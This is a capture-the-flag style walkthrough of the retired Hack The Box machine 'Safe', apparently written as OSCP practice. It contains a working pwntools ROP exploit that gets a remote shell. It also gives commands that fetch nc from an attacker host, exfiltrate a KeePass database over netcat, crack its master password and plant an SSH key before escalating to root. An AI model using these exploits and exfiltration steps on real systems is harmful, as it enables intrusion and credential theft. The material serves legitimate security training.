Safe is another box from TJNull's list of OSCP-like boxes from the HTB 'retired' archive. It is rated
as 'more challenging than OSCP, but good practice'.

nmap first.

The webpage is the default Apache index.html, but in the source there is a hint.

![web-hint](/assets/img/safe/safe-web-hint.png)


Browsing to http://10.10.10.147/myapp gives us a binary to download.


```
 file myapp
myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
```

64-bit ELF binary!


<hr width="250" size="6">




Im going to use [gdb-peda](https://github.com/longld/peda) to work with this binary; but before
opening it up it's helpful to find out what, if any, protections are in place on it.

Running checksec at myapp reveals NX enabled, so we cannot run shellcode directly in the exploit.

![checksec](/assets/img/safe/safe-checksec.png)



<hr width="250" size="6">


<h3>GDB-PEDA</h3>

Open myapp inside gdb-peda with:
```
gdb myapp
```

After initally running the binary, it seems that gdb-peda follows the child process, to select gdb to follow
the parent process instead use:
```
set follow-fork-mode parent
```

Take a look at `main` in the disassembler:

![main](/assets/img/safe/safe-disas-main.png)



<hr width="250" size="6">


Like metasploit-framework's pattern_create.rb and pattern_offset.rb we can work out the `offset`, or point just as the program crashes.


The following command will create a random pattern and save it to file called `ab`, which we can call as input later.

```
pattern create 200 ab
```

If we check our Kali pwd, with `ls` we find ab, look at it with cat:
```
cat ab

AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
```

Now run the program and crash it with the contents of `ab`:

```
r < ab
```

![1stcrash](/assets/img/safe/safe-peda-1stcrash.png)




<hr width="250" size="6">



Look at the `stack` section of the report; the value at the top of the stack will help give us our offset.

`pattern offset` can calculate this offset, which is the number of bytes that were processed before that pattern left at the top of the stack.


```
gdb-peda$ pattern offset jAA9AAOA
jAA9AAOA found at offset: 120   
```

To check our findings create a pattern of 120 character 'A's and append 8 character 'B's to it followed by a bunch of 'C's for padding, say 100 of them.

From the terminal outside peda, we can use a python command to quickly generate this.
```
python -c 'print "A"*120 + "B"*8 + "C"*100' > bb
```
check it with `cat`

```
cat bb

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

Now run it as input to myapp in gdb-peda.

```
r < bb
```
The result confirms our control.

Since we can't input shellcode, we need to use a [ROP exploit](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/), 
First lets check the functions.


```
info functions
```

![infofunctions](/assets/img/safe/safe-infofunctions.png)


The address of the `system` function is `0x401040`, but there's also a `test` function here (`0x401152`) that isn't called by the program. 


```
disas test
```

This gives us more info on the test function.

![testfunc](/assets/img/safe/safe-testfunc.png)


The contents of `rbp` moves through `rsp` and into `rdi`, then the function jumps (`jmp`) to `r13`

We can use [ropper](https://github.com/sashs/ropper)

```
ropper -f myapp |grep r13
```
This returns only the rop gadgets found that mention r13.

![ropper](/assets/img/safe/safe-ropper.png)


This looks like a good candidate:
```
0x0000000000401206: pop r13; pop r14; pop r15; ret;
```

The ROP gadget is at 0x401206


We have all the info we need to write a simple exploit.

<hr width="250" size="6">



The system call is at 0x401040

The test function call is at 0x401152

The ROP gadget is at 0x401206

We don't need r14 or r15, so fill them with Bs and Cs

We need to put our shell invocation (/bin/bash\x00) in the rpb to be moved to the rdi register via the test() function;
so we need to amend the buffer to include the command.

<hr width="250" size="6">


Here's the exploit:


```python

#/usr/bin/env python

from pwn import *

context(os="linux", arch="amd64")

shell = "/bin/sh\x00"
buf = "A" * (120 - len(shell))
system = p64(0x401040)
pop_r13 = p64(0x401206)
r14 = "B" * 8
r15 = "C" * 8
test = p64(0x401152)

payload = buf + shell + pop_r13 + system + r14 + r15 + test

p = remote("10.10.10.147", 1337)
p.recvline()
p.sendline(payload)
p.interactive()

```



<hr width="250" size="6">


We get an interactive shell:

![1337-shell](/assets/img/safe/safe-interactive-1337.png)


and the user flag:
```
$ cat /home/user/user.txt
7axxxxxxxxxxxxxxxxxxxxxxxxxxx90
```



<hr width="250" size="6">


<h3>Privilege Escalation</h3>


The contents of `/home/user` are interesting.


![homeuser](/assets/img/safe/safe-user-dir.png)


I want to get these files back to Kali to play with, but the current shell is rubbish, and I cant get a better one with python.

I create a working directory
```
mkdir /var/tmp/boo
```

from there I use wget to put `nc` on the target....its hosted on kali by a simple python webserver.
```
wget http://10.10.14.24/nc
```

Use chmod to make it executable
```
chmod +x /var/tmp/boo/nc
```

use nc to transfer the files:

`on Kali`
```
nc -nlvp 8888 > MyPasswords.kdbx
```

Then `on Safe` from /home/user
```
/var/tmp/boo/nc 10.10.14.24 8888 < MyPasswords.kdbx
```

repeat this process with the JPG files.

After the second .jpg file I realised there was an easier way.

I copied the contents of the /home/user directory to /var/tmp/boo

```
cp * /var/tmp/boo/
```

then changed to /var/tmp and used tar to compress the directory and send the resulting tarball.

```
cd /var/tmp
tar -czvf boo.tar.gz boo
mv boo.tar.gz boo/
cd boo
./nc 10.10.14.24 8888 < boo.tar.gz
```

on kali
```
nc -nlvp 8888 > boo.tar.gz
```

then decompress it.
```
tar -xvzf boo.tar.gz
```

better!

<h3>keepass2john + john</h3>


Keepass is a password manager, MyPasswords.kdbx is the database file containing the info we want, 
and one of these .JPG files contain the master password to access the file.

We need to use `keepass2john` to reformat the files in a way `john` can handle to crack the password.

```
for i in $(ls *.JPG);do keepass2john -k $i MyPasswords.kdbx > hash.txt;done;john -w=/root/wordlists/rockyou-30.txt hash.txt
```

![bullshit](/assets/img/safe/safe-bullshit.png)


###########

We can use kpcli (keepass cli) to access the database.

```
kpcli --key=IMG_0547.JPG --kdb=MyPasswords.kdbx
```

The database contains the root password.

```

<h3>Copy ssh public rsa to Authorized_keys</h3>


we can generate some ssh id_rsa keys, inject the public one into the user's Authorized_keys
and ssh as user.

```
ssh-keygen -t rsa
```

Select the pwd to save the files.

```
cat id_rsa.pub
```

copy the key, then echo it into an authorized_keys file.


```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/GpLAJJntS2Fkv <----snip--->" > /home/user/.ssh/authorized_keys
```


Then use the counterpart private key to log in.

```
ssh -i id_rsa user@10.10.10.147
```

`su -` to root with the recovered password and get the flag.



```

user@safe:~$ su -
